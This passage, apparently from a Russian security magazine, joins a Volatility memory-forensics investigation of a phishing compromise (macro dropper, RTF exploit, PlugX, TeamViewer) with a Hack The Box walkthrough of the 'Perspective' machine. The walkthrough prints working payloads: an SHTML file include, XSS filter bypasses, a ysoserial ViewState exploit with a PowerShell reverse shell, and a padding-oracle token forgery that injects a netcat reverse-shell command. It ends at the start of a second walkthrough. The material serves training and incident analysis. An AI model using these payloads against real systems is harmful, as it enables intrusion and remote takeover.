цию о системе, имя компь ютера, сетевой адрес и версию операционной сис-
темы.
   python2.7 vol.py -f "ecorpoffice/win7ecorpoffice2010-36b02ed3.

vmem" imgeinfo
   Версия ОС — Win7SP1x64. Мы будем ее указывать при поиске дру гих арте-
фак тов в качестве профиля в Volatility.
   Получим имя компь ютера, для этого проверим следующий ключ реестра:


SYSTEM\ControlSet001\Control\ComputerName\ComputerName


python2 vol.py -f ecorpoffice/win7ecorpoffice2010-36b02ed3.vmem \
--profile=Win7SP1x64 printkey -K  "ControlSet001\Control\
ComputerName\ComputerName"





               Имя компь ютера исследуемого образа

Имя компь ютера: WIN-191HVE3KTLO.
   Вы ясним сетевой адрес. Для этого проверим ключ, в котором содержатся
иден тификаторы сетевых адаптеров. Здесь же можно найти и информацию
о сети.


python2 vol.py -f  ecorpoffice/win7ecorpoffice2010-36b02ed3.vmem \
--profile=Win7SP1x86_23418 printkey \
-K "ControlSet002\Services\Tcpip\Parameters\Interfaces\{360E0CDC-
9C78-4D3B-A0Af-69CC45DE6D70}"





                  Сетевая информация о хосте

IP-адрес исследуемой машины — 10.1.1.122.
   Проанализируем запущен ные процессы в системе, их список выг рузим
в файл pstree.txt.


python2.7 vol.py -f "ecorpoffice/win7ecorpoffice2010-36b02ed3.
vmem" \
--profile=Win7SP1x64 pstree > ecorpoffice/pstree.txt




                       Список процессов

Мы обнаружили процесс OUTLOOK.EXE, иден тификатор процесса — 2692.
По сценарию нам известно, что инцидент произошел после того, как поль -
зователь запустил вложение в пись ме. Восстановим все сообщения поль -
зователя и найдем вредоносное. Для этого ищем в процессе все объекты
FILE.


python2.7 vol.py -f "ecorpoffice/win7ecorpoffice2010-36b02ed3.
vmem" \
--profile=Win7SP1x64 handles -p 2692 -t FILE > ecorpoffice/FILE_
OUTLOOK

В резуль тате анализа объектов FILE обнаружено имя почтового ящика поль -
зователя:


\Device\HarddiskVolume1\Users\phillip.price\AppData\Local\
Microsoft\Outlook\phillip.price@e-corp.biz.pst

Попробу ем выг рузить этот кон тейнер из памяти процесса. Найдем физический
адрес файла, исполь зуя плагин filescan .


python2.7 vol.py -f "ecorpoffice/win7ecorpoffice2010-36b02ed3.
vmem" \
--profile=Win7SP1x64 filescan > ecorpoffice/filescan`


             Ад рес почтового ящика поль зователя в системе

Выг ружаем найден ный файл, даем ему расширение .ost и заг ружаем в утилиту
OST Extractor.


python2.7 vol.py -f "ecorpoffice/win7ecorpoffice2010-36b02ed3.
vmem" \
--profile=Win7SP1x64 dumpfiles -Q 0x000000007d4d9450 -u -D
ecorpoffice/

Не забываем про аргу мент -u, который позволяет выг рузить боль шее количес-
тво дан ных.
   Получаем файл file.None.0xfffffa80042dcf10.dat. Тоже меняем ему
разрешение на .ost и заг ружаем в OST Extractor.





                Кон вертирование почтового кон тейнера

После кон вертирования OST в указан ной папке появит ся сообщение поль -
зователя в формате EML. Переходим в папку сообщений и смот рим его.





                       Заголовок пись ма





                    Содержимое сообщения

Пись мо отправлено с почтового ящика karenmiles@t-online.de. В аттаче —
документ bank_statement_088452.doc. IP-адрес почтового сервера — 31.6.
35.122. Пись мо поступило 4 октября 2016 года в 12:02:04 (UTC).
   Чтобы извлечь вложение, можно восполь зовать ся блок нотом, для этого
декодируем аттач из Base64 и сохраняем файл с расширением .doc. Либо
можешь открыть EML с помощью почтового клиента (того же Outlook).




                    Ис следовать  вредонос ные фай лы необ ходимо
                        в изолированной среде. Как создать лабора -
                      торию для ана лиза вредоносов, под робно рас -
                         ска зано в статье « Код под над зором. Создаем
                       виртуальную лабора торию для ана лиза мал вари ».


Итак, берем файл bank_statement_088452.doc и начинаем изу чать. Его MD5:


c2dbf24a0dc7276a71dd0824647535c9

Проверим наличие мак роса в получен ном вложении с помощью утилиты
olevba .


olevba bank_statement_088452.doc





                   Резуль тат работы утилиты olevba

Мак рос  силь но  обфусцирован,  и  по-быстрому  его  проанализировать
не получит ся, поэтому откроем документ в Microsoft Word и начнем отлаживать
скрипт на Visual Basic.





               Содержимое вредоносного докумен та

Перейдем в «Вид → Мак росы» и нажмем кнопку «Отладить». Находим сле-
дующий участок кода.





                     Содержимое мак роса

В фун кции xvkBjM выполняет ся запуск содержимого в перемен ной UsoJar.
Найдем место в коде, где формиру ется эта перемен ная, поставим точку оста-
нова и запустим скрипт.





                        От ладка скрипта

После выполнения этого участка кода в перемен ной UsoJar появит ся коман да
на PowerShell, которая декодирует дан ные и исполняет их.
   Преобразуем дан ные из Base64 и посмотрим содержимое.




                     Преобразован ные дан ные

Как видим, скрипт на PowerShell находит и запускает исполняемые файлы вот
из этой папки:


C:\Users\<user>\AppData\Local\Temp

Перед тем как запускать вредоносный документ, начнем записы вать сетевой
трафик, для этого запустим в виртуаль ной машине Wireshark .





             Сетевая активность вредоносного докумен та

Как видим, до запуска скрипта на PowerShell происходит заг рузка полезной
наг рузки с IP-адреса 54.174.131.235.



                    Заголовок сетевого пакета

Вредоносный скрипт на VBA заг ружает полезную наг рузку со следующего
адреса:


http://54.174.131.235/files/tv_x64.exe

Наг рузка будет сохранена в файл


C:\Users\<user>\AppData\Local\Temp\SkypeC2AutoUpdate.exe

Затем этот файл запускает ся.
   Процесс SkypeC2AutoUpdate.exe — это средство удален ного управления
TeamViewer.
   Найдем  системный иден тификатор  этого процесса в файле pstree.
Это 1364.


               Иден тификатор вредоносного процесса

Теперь изу чим сетевую активность процесса. Для этого извлечем из образа
все взаимодействия с сетью и сохраним в файлик netscan.txt.


python2.7 vol.py -f "ecorpoffice/win7ecorpoffice2010-36b02ed3.
vmem" \
--profile=Win7SP1x64 netscan > ecorpoffice/netscan.txt


             Сетевая активность вредоносного процесса

Процесс с иден тификатором 1364 взаимодейству ет с управляющим сервером
54.174.131.235.
   Получим дамп адресного пространства процесса.


python2.7 vol.py -f "ecorpoffice/win7ecorpoffice2010-36b02ed3.
vmem" \
--profile=Win7SP1x64 memdump -p 1364 -D ecorpoffice/

Выг ружен ный файл называется 1364.dmp.
   Теперь при помощи регулярного выражения найдем все взаимодействия
с управляющим сервером 54.174.131.235.

   strings 1364.dmp | grep '54.174.131.235'





               Взаимодействия с управляющим сервером

Вредоносный файл обращает ся вот на этот адрес:


http://54.174.131.235/getinfo[.]php

Установив соединение, он отправляет собранную информацию. Версия прог -
рам много обеспечения TeamViewer (параметр tvrv=) — 0.2.2.2.
   Попробу ем вытащить дан ные из полей TeamViewer, нам интересен его
пароль и иден тификатор. Для этого восполь зуем ся плагином editbox.


python2.7 vol.py -f "ecorpoffice/win7ecorpoffice2010-36b02ed3.
vmem" \
--profile=Win7SP1x64 editbox





                      Иден тификатор хоста

Иден тификатор системы — 528 812 561.





               Пароль для доступа к удален ному хосту

Пароль для доступа к хосту — P59fS93m.
   Попробу ем вытащить из процесса интересную информацию, связан ную
с работой TeamViewer.
   strings 1364.dmp | grep 'teamviewer' -B 3 -A 3




                Обнаружен ный сетевой адрес

В памяти процесса обнаружен сетевой адрес 31.6.13.155, с которого произо-
шел удален ный вход в систему.
   Исполь зовав плагин procdump, получим этот процесс, чтобы проверить
через VirusTotal.


python2.7 vol.py -f "ecorpoffice/win7ecorpoffice2010-36b02ed3.
vmem" \
--profile=Win7SP1x64 procdump -p 1364 -D ecorpoffice/




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                       РАССЛЕДУЕМ ЗАРАЖЕНИЕ
                       МАШИНЫ С WINDOWS
                      ШПИОНСКИМ ТРОЯНОМ




Получим его хеш и найдем его описание на  VirusTotal. MD5-сум ма —
6ecd2ed83b0bc2eea7c7a75d06a610b6 .
   Так же проанализируем все пись ма в папке после работы утилиты ost-
extractor.exe.





                   Пись мо с информацией о выкупе

Давай теперь зафик сиру ем картину произошед шего.
   04.10.2016 в 12:02 (UTC) на адрес philip.price@e-corp.biz с адреса
armadac0ll3ct1ve@gmail.com поступило пись мо,  в котором сообщает ся
номер цифрового кошель ка,  куда необходимо перевести  выкуп. Адрес
кошель ка Bitcoin:


25UMDkGKBe484WSj5Qd8DhK6xkMUzQFydY

04.10.2016  в  12:02:04  (UTC)  на  адрес  philip.price@e-corp.biz
от karenmiles@t-online.de приш ло фишин говое сообщение, содержащее
вредоносный документ bank_statement_088452.doc. Поль зователь открыл
этот документ, что и привело к ком прометации компь ютера. С адреса http://
54.174.131.235/files/tv_x64.exe на его машину заг ружается исполняемый
файл TeamViewer, содержащий иден тификатор и пароль для доступа к ском -
прометирован ному хосту.
  В    12:02    04.10.2016    на    адрес    philip.price@e-corp.biz
от armadac0ll3ct1ve@gmail.com приш ло сообщение с адресом кошель ка
Bitcoin. Если ком пания не переведет на него определен ную сум му, злоумыш -
ленники начнут атаковать инфраструк туру организации.


ÈÑÑËÅÄÎÂÀÍÈÅ ÎÁÐÀÇÀ ECORPWIN7
Получим первичную информацию о системе.


python2 vol.py -f ecorpwin7/ecorpwin7-e73257c4.vmem --
profile=Win7SP1x64 imageinfo


python2 vol.py -f ecorpwin7/ecorpwin7-e73257c4.vmem --
profile=Win7SP1x64 printkey \
-K  "ControlSet001\Control\ComputerName\ComputerName"`


python2 vol.py -f ecorpwin7/ecorpwin7-e73257c4.vmem --
profile=Win7SP1x64 printkey \
-K  "ControlSet002\Services\Tcpip\Parameters\Interfaces\{3AE5A5FF-
4A27-4327-9C26-1493676FB9E5}"

Имя компь ютера — WIN-KMUKM7JPN9D, сетевой адрес — 10.1.1.141, профиль
операционной системы — Win7SP1x64.
  Далее получим  список процессов  в виде  дерева,  а  так же сетевую
активность. Резуль тат сохраним в файл.


python2.7 vol.py -f "ecorpwin7/ecorpwin7-e73257c4.vmem" \
--profile=Win7SP1x64 pstree > ecorpwin7/pstree


python2.7 vol.py -f "ecorpwin7/ecorpwin7-e73257c4.vmem" \
--profile=Win7SP1x64 netscan > ecorpwin7/netscan

Находим почтовый процесс OUTLOOK.EXE, иден тификатор 2496.
  Получим дамп адресного пространства этого процесса.


python2.7 vol.py -f "ecorpwin7/ecorpwin7-e73257c4.vmem" \
--profile=Win7SP1x64 memdump -p 2496 -D ecorpwin7/

Получим список объектов FILE в адресном пространстве процесса.


python2.7 vol.py -f "ecorpwin7/ecorpwin7-e73257c4.vmem" \
--profile=Win7SP1x64 handles -t FILE -p 2496 > ecorpwin7/handles_
file_2496

Получаем файл handles_file_2496, а в нем название дру гого файла:


Outlscott.knowles@e-corp.biz-00000004.pst

Это почтовый кон тейнер. Найдем его физический адрес и выг рузим его
из образа. Для этого получим список файлов:


python2.7 vol.py -f "ecorpwin7/ecorpwin7-e73257c4.vmem" \
--profile=Win7SP1x64 filescan > ecorpwin7/filescan


            Физический адрес почтового кон тейнера

Восстановим почтовый кон тейнер.


python2.7 vol.py -f "ecorpwin7/ecorpwin7-e73257c4.vmem" \
--profile=Win7SP1x64 dumpfiles -Q 0x000000007de17f20 -u -D
ecorpwin7/

Теперь кон вертируем файл с помощью OST Extractor и находим сообщение
с вложением.





               Содержимое вредоносного пись ма





                       Заголовок пись ма

04.10.2016 в 13:35:13 (UTC) от lloydchung@allsafecybersec.com поступило
пись мо, содержащее вредоносное вложение. IP-адрес почтового сервера
отправителя — 31.6.35.122. Выг рузим вложения с помощью Outlook.
  Получаем файл RTF:


Important_ECORP_Lawsuit_Washington_Leak.rtf

Но эта версия файла битая. Поэтому попробу ем восстановить его не из сооб-
щения, а из памяти. Находим его по названию в выг ружен ном списке файлов.


            Физический адрес вредоносного файла

Восстановим его.


python2.7 vol.py -f "ecorpwin7/ecorpwin7-e73257c4.vmem" \
--profile=Win7SP1x64 dumpfiles -Q 0x000000007d6b3850 -u -D
ecorpwin7/

От кры ваем восстановленный файл в Hex-редак торе и удаляем в кон це нез-
начащие нули. MD5-сум ма этого файла:


00e4136876bf4c1069ab9c4fe40ed56f

Это реализация эксплоита в докумен те RTF (CVE-2010-3333). Под робнее
о нем можешь прочесть в исследовании Sophos (PDF).
   Начнем анализ вредоносного докумен та. Получим список потоков:


py rtfdump.py file.None.0xfffffa80040b3260.dat.rtf





                  Список потоков докумен та RTF

Сог ласно исследованию Sophos, полезная наг рузка находит ся за фраг ментом
\sv.





                  Содержимое докумен та RTF

Полезная наг рузка начинается после 0xacc8. Выг рузим наг рузку и сохраним
в файл shell.


py rtfdump.py  file.None.0xfffffa80040b3260.dat.rtf -s 5 -H -d >
shell

Далее с помощью утилиты scdbg найдем точку входа шелл-кода.


scdbg /f shell /findsc





                      Поиск точки входа

Полезная наг рузка заг ружается с ресурса по следующему адресу:


http://files.allsafecybersec.com

Проанализируем процессы.



  Процесс svchost.exe с запущен ными дочерними процессами rundll32.exe

Мы обнаружили процесс svchost.exe с иден тификатором 288, запустивший
дочерние процессы rundll32.exe. Получим информацию об их запуске
при помощи плагина cmdline.


python2.7 vol.py -f ecorpwin7/ecorpwin7-e73257c4.vmem \
--profile=Win7SP1x64 cmdline >  ecorpwin7/cmdline





                       Запуск rundll32.exe

Как видим, rundll32.exe запускает динамическую библиотеку C:\ProgramData\
test.DLL, фун кция экспорта GnrkQr.
  Выг рузим test.DLL и проверим его на  VirusTotal. Для этого найдем
физический адрес файла.


              Физический адрес файла test.DLL


python2.7 vol.py -f ecorpwin7/ecorpwin7-e73257c4.vmem \
--profile=Win7SP1x64 dumpfiles -Q 0x000000007e8b03c0 -D c74-
TeamSpy/ecorpwin7/

Его MD5 — 2769761a23f793d93bbad3ded28e8ebd.
  Файлик оказался вредоносным и относит ся к семейству PlugX .
  Найдем управляющий сервер процесса с иден тификатором 288.


                    Ад рес управляющего сервера

Вредоносный    модуль    взаимодейству ет    с    управляющим    сер-
вером 52.90.110.169.
  Далее получим дамп адресного пространства процесса.


python2.7 vol.py -f ecorpwin7/ecorpwin7-e73257c4.vmem \
--profile=Win7SP1x64 memdump -p 288 -D ecorpwin7/

Найдем  все   URI,  через  которые  шло  взаимодействие  с  files.
allsafecybersec.com:


strings  288.dmp | grep files.allsafecybersec.com



                        Заг рузка линукс-пакета

Для бокового перемещения по сети и заражения машин с Linux злоумыш -
ленник заг рузил модуль linuxav.deb.
  Продолжаем анализировать процессы и находим запущен ный исполняемый
файл conhost.exe, который обрабаты вает кон соль ные окна в последних вер-
сиях Windows.


              Обнаружен ный процесс conhost.exe

Получим дамп его адресного пространства.


python2.7 vol.py -f "ecorpwin7/ecorpwin7-e73257c4.vmem" --
profile=Win7SP1x64 memdump -p 3056 -D ecorpwin7/

Теперь проанализируем строки в дам пе процесса.
  Обычно, попав в систему, злоумыш ленники начинают искать в ней интерес-
ные файлы, чтобы их выг рузить. Посмотрим, как злоумыш ленник выг ружал
файлы со ском прометирован ной системы. Найдем все файлы с расширениями
.zip и .rar. При поиске архивов RAR находим файл report.rar.


strings -el 3056.dmp | grep reports.rar  -B 3 -A 3




                  Резуль тат поиска файла report.rar

Пароль выг ружаемых дан ных — password1234.
  Под водим итоги.
   04.06.2016 в 13:35:13 (UTC) на почтовый адрес scot.knowles@e-corp.
biz от lloydchung@allsafecybersec.com поступило фишин говое сообщение,
в которое вложен документ. Этот документ содержит эксплоит CVE-2010-
3333, в резуль тате запуска которого произош ла ком прометация компь ютера.
Далее на ском прометирован ный компь ютер установлен вредоносный образец
семейства PlugX с управляющим сервером 52.90.110.169. После получения
доступа злоумыш ленники начали выг ружать докумен ты в запаролен ном архиве
и для даль нейшего зак репления на серверах организации попытались заг -
рузить модуль linuxav.deb.


ÂÛÂÎÄÛ
Итак, мы восстановили действия злоумыш ленника. Ком прометация сети про-
изош ла 04.10.2016 в 12:02 (UTC). С почтового сервера 31.6.35.122 на элек -
трон ные почтовые адреса поль зователей philip.price@e-corp.biz и scot.
knowles@e-corp.biz поступили вредоносные сообщения. В качестве вло-
жения исполь зовался документ с расширением .doc, содержащий мак рос
на Visual Basic, и документ RTF с внед ренным эксплоитом. Рассылка шла
с почтового сервера 31.6.35.122.
   Ког да поль зователь открыл заражен ный документ, на ском прометирован -
ный компь ютер WIN-191HVE3KTLO заг рузилось средство удален ного админис-
трирования TeamViewer, а на хост WIN-KMUKM7JPN9D — вредоносный обра-
зец семейства PlugX. После получения кон троля над сетью организации зло-
умыш ленники пот ребовали выкуп в размере пяти бит коинов.
ВЗЛОМ





      ОБХОДИМ XSS-ФИЛЬТРЫ
         И АТАКУЕМ ШИФР
        ЧЕРЕЗ PADDING ORACLE





Сегод ня я покажу, как повысить при виле-
гии в системе с помощью ата ки Padding
Oracle. На пути к ней мы ата куем механизм
смены пароля на сай те, обой дем XSS-
фильтры   и   используем   уяз вимость             RalfHacker                                                                                          hackerralf8@gmail.com
в механиз ме сери али зации дан ных.


Проходить будем «безум ный» по сложности тренировочный стенд Perspective
с площад ки Hack The Box.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts, чтобы было удобнее обращать ся
к ней:


10.10.11.151    perspective.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

Скрипт нашел два откры тых порта: 22 — служба OpenSSH for Windows и 80 —
веб-сервер Microsoft IIS 10.0. Кроме как с веб-сервером, работать пока не с
чем.





                  Главная страница сайта perspective.htb


ÒÎ×ÊÀ ÂÕÎÄÀ
На сайте можно зарегистрировать ся и авторизовать ся. Сразу сделаем это, так
как зарегистрирован ным поль зователям доступно боль ше фун кций, а значит,
будет боль ше мест для тестирования.





            Главная страница зарегистрирован ного поль зователя

На сайте есть возможность создавать и просматривать продук ты. Но что более
интересно, мы находим почтовый адрес админа, а так же возможность сбра-
сывать пароль.





                    Форма сброса пароля

После ввода почтового адреса нам задают вопросы, ответы на которые мы
указывали при регистрации. Причем, если мы указываем почтовый адрес
админа, вместо вопросов отображается сообщение о том, что сброс пароля
администратора не включает сек ретные вопросы и процеду ра недоступна.





                Форма с сек ретны ми вопросами

Но если перехватить запрос на сброс пароля после ответа на вопросы, можно
увидеть, что, помимо прочего, на сервер передается и почтовый адрес.





               Перехвачен ный запрос на сброс пароля

Я изменил свой почтовый адрес на admin@perspective.htb и все равно
получил новую форму, в которой нужно указать новый пароль. Мало того,
пароль можно установить!





                 Форма ввода нового пароля




            Сообщение об успешном изменении пароля

Авторизу емся от имени админа и получаем доступ к админ ской панели.





                    Главная страница администратора


ÒÎ×ÊÀ ÎÏÎÐÛ
Ад мин может смот реть продук ты дру гих поль зователей, для этого достаточно
указать имя поль зователя или почтовый адрес.





                     Продук ты поль зователя

Вдобавок к этому можно скачать PDF со списком продук тов. В нем все то же
самое, что и на сайте.





                   Сгенерирован ный PDF-документ

Тог да перейдем обратно к созданному аккаунту и попробу ем добавить про-
дукт. Для продук та можно указать изображение — это очень интересный
момент, так как это изображение (точнее, файл) будет вставлено в PDF. Зна-
чит, можно попробовать под ключить файл SHTML, что при его включении в PDF
позволит получить содержимое произволь ного файла с диска. Давай создадим
SHTML, который заг рузит файл кон фигураций web.config:


<!--#include file="../web.config"-->





                   Панель добавления продук та

Но при заг рузке такого файла сервер выдаст ошибку — заг ружать можно толь -
ко изображение. Это можно обойти, если в Burp Proxy исправить содер-
жимое HTTP-заголовка Content-Type обратно на image/jpeg.





                   Запрос на сервер в Burp Proxy

В Burp History обнаружим запрос к SHTML и кон фигурации в ответе.





                       Запрос в Burp History

Из интересного отмечаем сервис на порте 8000, доступный для локаль ного
хоста, а так же зашифрован ный пароль.





                 Содержимое файла web.cong


XSS
Так как есть промежу точный сервис обработ ки и преобразования введен ных
нами дан ных, следует поискать дру гие уязвимости, которые помогут эксфиль -
тровать дан ные с внут реннего сервера на порте 8000. И натыкаемся на филь тр
XSS.





         Сообщение об обнаружении вредоносной активности

Так как исполь зуют ся филь тры, стоит перебрать возможные варианты наг -
рузок. Это поможет найти наг рузку, обходящую филь тры. Перехватываем зап-
рос в Burp Proxy и перенаправляем в Burp Intruder (ком бинация клавиш Ctrl-I,
Ctrl-Shift-I).





                    Burp Intruder — вклад ка Positions

В опциях добавим параметр Grep — Extract и выберем опознаватель ную стро-
ку, которая будет сообщать об обнаружен ной атаке.





         Burp Intruder — вклад ка Options (параметр Grep — Extract)

Эта опция добавит в резуль тат перебора еще один столбец, который отоб-
разит возвращен ное сервером сообщение. Так мы быстро отфиль тру ем наг -
рузки, которые обходят филь тр. Для перебора я взял готовый список с гит хаба
Payload Box.





                    Резуль тат перебора наг рузок

В резуль тате находим немало вариантов для эксплу атации XSS. Остановим ся
на исполь зовании тега meta:


<META HTTP-EQUIV="refresh" CONTENT="0;url=http://10.10.14.58:8000/
test.html">

Эта наг рузка должна включить в отчет страницу test.html с нашего сервера.
Для теста откроем на локаль ном хосте порт 8000 и отправим наг рузку.





                    Проверка уязвимости XSS





                      Логи листенера netcat

Запрос пришел, а значит, сервис уязвим!


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                      ОБХОДИМ XSS-ФИЛЬТРЫ
                           И АТАКУЕМ ШИФР
                            ЧЕРЕЗ PADDING ORACLE





ÏÐÎÄÂÈÆÅÍÈÅ
Теперь перейдем к содержимому под ключаемого файла. В нашем HTML-фай-
ле будем исполь зовать тег iframe для заг рузки и отображения сервиса
на порте 8000.


<iframe src="http://localhost:8000/"></iframe>

Генерируем PDF и видим в нем нужную нам страницу.





                    Сгенерирован ный PDF-файл

Страница полностью не поместилась во фрейм, поэтому зададим ему раз-
меры.


<iframe src="http://localhost:8000/" height="2500px" width=
"2500px"></iframe>





                    Сгенерирован ный PDF-файл

Теперь можем разобрать содержимое страницы. Видим фун кции encrypt
и decrypt, а так же ссылку на скрипт. Просмотрим код указан ного JS-файла.


<iframe src="http://localhost:8000/swagger/v1/swagger.json"
height="2000px" width="2000px"></iframe>





               Содержимое страницы swagger.json

При  обращении  к  странице  decrypt  нужно  предоставить  параметр
cipherTextRaw. Теперь мы можем попробовать расшифровать получен ный
из файла web.config параметр ViewStateUserKey.
   Чтобы отправить дан ные и получить ответ, нужно усложнить включаемый
нами файл HTML. Для этого создадим и заполним форму, отправлять которую
будем с помощью JavaScript, а резуль тат поместим в iframe.


<html>
<body>
<form id="expl" target="iframe" method="post" action="http://
localhost:8000/
decrypt?cipherTextRaw=ENC1%3a3UVxtz9jwPJWRvjdl1PfqXZTgg%3d%3d">
<input type="text">
</form>
<iframe name="iframe"></iframe>
<script type="text/javascript">document.getElementById('expl').
submit();</script>
</body>
</html>





              Расшифрован ный параметр ViewStateUserKey

Теперь, ког да мы имеем ViewStateUserKey, следует попробовать получить
RCE  через  сериализацию  .NET.  Веб-приложения  ASP.NET  исполь зуют
ViewState для кон троля состояния страницы и сохранения дан ных в формах.
И поэтому есть возможность запустить код на веб-сервере, если получит ся
под делать ViewState. А для этого нам и нужны значения ViewStateUserKey,
validationAlg и validationKey.





                 Дан ные validationalg и validationkey

Теперь с помощью Online Reverse Shell Generator сгенерируем реверс-шелл.
Нужно указать хост и порт для обратного под ключения.





                   Сгенерирован ный реверс-шелл

Сериализовать дан ные мы можем с помощью ysoserial .


ysoserial.exe -p ViewState -g TextFormattingRunProperties -c
"powershell -e JABjA...AKAApAA==" --generator=0414C274
--validationalg="SHA1" --viewstateuserkey="SAltysAltYV1ewSTaT3"
--validationkey="99F110...B52BF"





                    Сериализация дан ных

Теперь отправляем получен ные дан ные в парамет ре __VIEWSTATE и получаем
бэк коннект.





                     Эксплу атация уязвимости





                        Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Для удобного доступа к хосту мы можем выяснить приват ный ключ SSH поль -
зователя и уже с ним получить стабиль ную коман дную оболочку.





                      SSH-ключ поль зователя

Для разведки на хосте я решил исполь зовать WinPEAS, но столкнулся с тем,
что, если попытать ся заг рузить на хост исполняемый файл, его удалит анти-
вирус.
  Посколь ку мы имеем дело с  .NET, сборку файла можно выполнить
из памяти с помощью PowerShell, без заг рузки файла на диск. Сначала коман -
дой python3 -m http.server 8000 запустим простой веб-сервер, а затем
заг рузим сборку в память и выполним.


powershell -c $wp=[System.Reflection.Assembly]::Load([byte[]](
Invoke-WebRequest "http://10.10.14.82:8000/wp.exe"
-UseBasicParsing | Select-Object -ExpandProperty Content)); [
winPEAS.Program]::Main("")

В списке откры тых портов найдем нетипичный для Windows порт 8009.





                  Список прослушиваемых портов

Чтобы зайти на него через браузер, нам нужно прокинуть порт. Сделать
это можно средствами SSH.


ssh -i id_rsa webuser@perspective.htb -L 8009:127.0.0.1:8009

Таким образом, весь трафик, который мы отправим на локаль ный порт 8009,
будет  тун нелирован  на  порт  8009  указан ного  хоста  (в  дан ном  слу -
чае 127.0.0.1) через SSH-хост. Теперь под ключим ся к порту и найдем там уже
знакомый сайт.





                    Главная страница локаль ного сайта

Попробу ем привычным образом изменить пароль, но в этот раз что-то не так.





         Дан ные, отправляемые при смене пароля поль зователя

Попробу ем поиг рать с токеном, к примеру добавить несколь ко сим волов
или изменить существу ющие. Получаем сообщения об ошибках, которые
говорят о наличии блочного шифра.





              Ошибка длины последователь ности





                Ошибка неверного дополнения

Здесь мы можем попробовать применить технику Padding Oracle, но сперва
взглянем на сам проект. Если обратить ся к пути проекта, увидим заг лушку.





                      Ошибка 404

Из файла web.config узнаем, что исполь зует ся алгоритм шифрования AES.



                 Содержимое файла web.cong

Но боль ший интерес пред ставляет фун кция проверки пароля вот в этом файле:


C:\WEBAPPS\PartImages_Staging\handlers\changePassword.ashx





              Содержимое файла changePassword.ashx

После расшифровки токен тоже передается прог рамме PasswordReset.exe.
Если мы сможем манипу лировать токеном до шифрования, то выполним инъ-
екцию коман ды ОС. Тут и перейдем к атаке Padding Oracle.


Padding Oracle
Эта атака применима к шифрованию CBC, в котором сообщение разбивается
на блоки длиной X байт и каждый блок ксорит ся с предыду щим зашифрован -
ным блоком. Затем резуль тат шифрует ся. Что очень важно, шифрование
выполняет ся блоками фик сирован ного размера.
   Чтобы  гаран тировать  точное  размещение откры того  тек ста в одном
или несколь ких блоках, часто исполь зует ся дополнение (padding). Это допол-
нение может быть выполнено несколь кими способами, самый распространен -
ный — PKCS7. В PKCS7 дополнение будет состоять из одного и того же чис-
ла — количества недостающих байтов. Например, если в откры том тек сте
отсутству ет два байта, заполнение будет \x02\x02.
   Суть атаки зак лючается в том, что мы, манипу лируя дан ными и получая
информацию о верности дополнения, можем раскрыть весь исходный текст.
Очень под робно о теории этой атаки можно прочитать на «Хабрахабре»
в статье «Padding Oracle Attack, или почему криптография пугает » и ее продол-
жении.
  Мы же будем исполь зовать готовый скрипт PadBuster. Указываем сле-
дующие парамет ры:
 • URL;
 • саму последователь ность;
 • размер блока;
 • от вет, говорящий об ошибке;
 • текст, который нужно зашифровать.

В качестве наг рузки для инъекции коман ды исполь зуем обычный реверс-шелл.
Это будет заранее заг ружен ный netcat:


n.exe -e cmd.exe 10.10.14.84 4321

В качестве разделителя исполь зуем амперсанд:


padbuster http://127.0.0.1:8009/handlers/changePassword.ashx
lhi98x_p_eJ1C5zt7w-8ogpurkeg36_bk0Vq9cyC5yI 16 -post
'password1=rrRR11!!&password2=rrRR11!!&
token=lhi98x_p_eJ1C5zt7w-8ogpurkeg36_bk0Vq9cy
C5yI' -encoding 4 -error 'Padding is invalid and cannot be
removed.' -plaintext 'r & C:\Temp\n.exe -e cmd.exe 10.10.14.84
4321'




                        Новый токен

В итоге у нас есть новый токен. Исполь зуем его на сайте и получаем бэк -
коннект на откры тый листенер (rlwrap nc -lnvp 4321).





                            Флаг рута

Машина захвачена!
ВЗЛОМ





         АТАКУЕМ ВЕБ-СЕРВЕР
       ЧЕРЕЗ MPDF И ПОВЫШАЕМ
      ПРИВИЛЕГИИ С ПОМОЩЬЮ
           LINUX CAPABILITIES



В этом рай тапе я покажу, как использовать
обход авто риза ции через SQL-инъекцию,
затем  мы   про эксплу ати руем  mPDF
и повысим при вилегии на сер вере через
систему Linux capabilities, а кон крет но —             RalfHacker                                                                                          hackerralf8@gmail.com
через воз можность cap_sys_ptrace .


Полировать свои навыки мы будем при помощи тренировочного стен да Faculty
с площад ки Hack The Box. Уровень сложности заявлен как сред ний.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.169    faculty.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
